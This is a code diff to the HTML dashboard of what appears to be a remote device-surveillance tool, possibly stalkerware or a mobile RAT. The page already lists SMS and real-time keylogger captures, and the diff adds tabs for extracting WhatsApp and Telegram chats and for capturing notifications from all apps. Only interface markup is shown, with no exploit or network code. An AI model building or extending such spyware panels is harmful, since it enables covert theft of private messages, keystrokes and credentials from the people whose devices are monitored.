@@ -2015,6 +2015,12 @@
         <button class="device-tab" data-tab="keylog" onclick="switchDeviceTab('keylog')" title="Real-time keystroke captures">
           <i class="ri-keyboard-line" style="color:#00e5ff"></i><span style="color:#00e5ff">Keylog</span>
         </button>
+        <button class="device-tab" data-tab="whatsapp" onclick="switchDeviceTab('whatsapp')" title="WhatsApp/Telegram chat extraction">
+          <i class="ri-chat-3-line" style="color:#25D366"></i><span style="color:#25D366">Chats</span>
+        </button>
+        <button class="device-tab" data-tab="noti" onclick="switchDeviceTab('noti')" title="Real-time notifications from all apps">
+          <i class="ri-notification-3-line" style="color:#FF9800"></i><span style="color:#FF9800">Noti</span>
+        </button>
       </div>
 
       <!-- ===== TAB: SMS ===== -->
@@ -2246,6 +2252,55 @@
           <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading keystroke captures...</span></div>
         </div>
         <div id="keylogPagination" style="margin-top:12px"></div>
+      </div>
+
+      <!-- ===== TAB: WHATSAPP CHATS ===== -->
+      <div class="device-tab-content" id="tab-whatsapp">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px">
+          <div style="display:flex;align-items:center;gap:8px">
+            <div class="tab-search-wrap" style="width:280px">
+              <i class="ri-search-line"></i>
+              <input type="text" id="whatsappSearch" placeholder="Search chats..." oninput="filterWhatsAppChats()">
+            </div>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center">
+            <span id="whatsappCount" style="font-size:11px;color:var(--muted)">0 messages</span>
+            <span id="whatsappLiveBadge" style="display:none;font-size:10px;color:#25D366;font-weight:600;animation:fxBlink 1.5s infinite">● LIVE</span>
+            <button class="btn btn-outline btn-sm" onclick="clearWhatsAppChats()" style="color:#f44336;border-color:#f44336">
+              <i class="ri-delete-bin-line"></i> Clear
+            </button>
+          </div>
+        </div>
+        <div id="whatsappListContainer" style="max-height:500px;overflow-y:auto">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading chat messages...</span></div>
+        </div>
+        <div id="whatsappPagination" style="margin-top:12px"></div>
+      </div>
+
+      <!-- ===== TAB: NOTIFICATIONS (Noti) ===== -->
+      <div class="device-tab-content" id="tab-noti">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px">
+          <div style="display:flex;align-items:center;gap:8px">
+            <div class="tab-search-wrap" style="width:280px">
+              <i class="ri-search-line"></i>
+              <input type="text" id="notiSearch" placeholder="Search notifications..." oninput="filterNotifications()">
+            </div>
+            <select id="notiAppFilter" onchange="filterNotifications()" style="background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:6px;padding:6px 10px;font-size:12px">
+              <option value="">All Apps</option>
+            </select>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center">
+            <span id="notiCount" style="font-size:11px;color:var(--muted)">0 notifications</span>
+            <span id="notiLiveBadge" style="display:none;font-size:10px;color:#FF9800;font-weight:600;animation:fxBlink 1.5s infinite">● LIVE</span>
+            <button class="btn btn-outline btn-sm" onclick="clearNotifications()" style="color:#f44336;border-color:#f44336">
+              <i class="ri-delete-bin-line"></i> Clear
+            </button>
+          </div>
+        </div>
+        <div id="notiListContainer" style="max-height:500px;overflow-y:auto">
+          <div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading notifications...</span></div>
+        </div>
+        <div id="notiPagination" style="margin-top:12px"></div>
       </div>
 
     </div>
